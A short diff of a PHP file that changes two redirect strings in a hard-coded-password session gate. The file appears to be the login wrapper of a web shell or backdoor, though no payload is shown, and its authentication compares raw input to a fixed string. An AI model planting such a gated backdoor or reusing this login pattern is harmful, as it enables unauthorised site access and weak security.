@@ -8,7 +8,7 @@ session_start();
 $pass = "add9513f396ac1198675b06122bba943eb9e0776";
 if($_POST['password'] == $pass) {
   $_SESSION['forbidden'] = $pass;
-  echo "<script>window.location='?zet'</script>";
+  echo "<script>window.location='?z4phy'</script>";
 }
 if($_GET['page'] == "blank") {
   echo "<a href='?'>Back</a>";
@@ -16,7 +16,7 @@ if($_GET['page'] == "blank") {
 }
 if(isset($_REQUEST['logout'])) {
   session_destroy();
-  echo "<script>window.location='?zet'</script>";
+  echo "<script>window.location='?z4phy'</script>";
 }
 if(!($_SESSION['forbidden'])) {
 ?>
